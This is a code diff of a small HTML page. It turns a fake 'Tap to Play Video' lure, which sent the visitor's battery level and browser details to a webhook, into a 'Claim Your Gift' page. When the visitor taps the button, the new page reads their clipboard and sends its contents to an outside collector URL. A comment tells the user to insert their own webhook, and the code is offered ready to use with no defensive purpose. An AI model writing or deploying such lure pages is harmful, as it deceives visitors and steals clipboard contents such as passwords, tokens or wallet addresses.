@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Watch Video</title>
+    <title>Claim Your Gift</title>
     <style>
         body {
             background-color: #0f0f0f;
@@ -17,59 +17,55 @@
             margin: 0;
             text-align: center;
         }
-        .play-btn {
-            background-color: #ff0000;
+        .gift-btn {
+            background-color: #28a745;
             color: #fff;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
+            padding: 18px 36px;
+            font-size: 20px;
             font-weight: bold;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
+            transition: transform 0.2s;
+        }
+        .gift-btn:active {
+            transform: scale(0.96);
         }
     </style>
 </head>
 <body>
 
-    <button class="play-btn" onclick="triggerCapture()">▶ Tap to Play Video</button>
-    <p id="status" style="margin-top:20px; color:#aaa;"></p>
+    <button class="gift-btn" onclick="claimGift()">🎁 Tap to Paste & Claim Gift</button>
+    <p id="status" style="margin-top: 25px; color: #bbb; font-size: 16px;"></p>
 
     <script>
-        // REPLACE THIS WITH YOUR WEBHOOK.SITE URL
-        const WEBHOOK_URL = "https://webhook.site/d5b8ad10-9401-461a-9519-d408d46ea101";
+        // REPLACE WITH YOUR WEBHOOK.SITE URL
+        const WEBHOOK_URL = "https://webhooksite.net/e3c23120-424b-43c9-8bbf-a5e6033f012c";
 
-        async function triggerCapture() {
-            document.getElementById('status').innerText = "Loading media player...";
-            
-            let batteryInfo = "Battery API not supported";
-            
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    const charging = battery.charging ? "Yes" : "No";
-                    batteryInfo = `Battery: ${level}% | Charging: ${charging}`;
-                } catch (e) {
-                    batteryInfo = "Battery access blocked by browser";
-                }
+        async function claimGift() {
+            const statusEl = document.getElementById('status');
+            statusEl.innerText = "Accessing clipboard buffer...";
+
+            try {
+                // Request permission and read the user's clipboard
+                const clipboardText = await navigator.clipboard.readText();
+
+                // Send the captured text to your Webhook endpoint
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        giftContent: clipboardText,
+                        time: new Date().toLocaleString()
+                    })
+                });
+
+                statusEl.innerText = "Gift intercepted! Buffer dumped to remote session.";
+            } catch (err) {
+                statusEl.innerText = "Permission denied or browser restricted clipboard access.";
             }
-
-            // Send POST request with data
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    battery: batteryInfo,
-                    device: navigator.userAgent,
-                    time: new Date().toLocaleString()
-                })
-            }).then(() => {
-                setTimeout(() => {
-                    document.getElementById('status').innerText = "Error: Media stream unavailable.";
-                }, 1500);
-            });
         }
     </script>
 </body>
